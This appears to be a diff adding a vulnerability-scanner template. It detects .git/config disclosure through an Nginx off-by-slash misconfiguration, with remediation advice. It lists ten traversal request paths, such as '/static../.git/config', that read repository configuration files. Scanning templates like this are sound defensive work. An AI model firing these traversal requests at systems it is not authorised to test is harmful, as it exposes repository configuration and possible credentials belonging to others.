@@ -1,0 +1,33 @@
+id: git-config-nginxoffbyslash
+
+info:
+  name: Git Config Disclosure via Nginx Off-by-Slash
+  author: organiccrap
+  severity: medium
+  description: |
+    Detects disclosure of `.git/config` file due to Nginx misconfiguration allowing traversal with off-by-slash paths. 
+  reference:
+    - https://twitter.com/Random_Robbie/status/1262676628167110656
+  remediation: |
+    Ensure proper access control is applied to sensitive files. Restrict access to `.git` directories in the web server configuration.
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/static../.git/config'
+      - '{{BaseURL}}/js../.git/config'
+      - '{{BaseURL}}/images../.git/config'
+      - '{{BaseURL}}/img../.git/config'
+      - '{{BaseURL}}/css../.git/config'
+      - '{{BaseURL}}/assets../.git/config'
+      - '{{BaseURL}}/content../.git/config'
+      - '{{BaseURL}}/events../.git/config'
+      - '{{BaseURL}}/media../.git/config'
+      - '{{BaseURL}}/lib../.git/config'
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
+    matchers:
+      - type: word
+        words:
+          - '[core]'
+        part: body
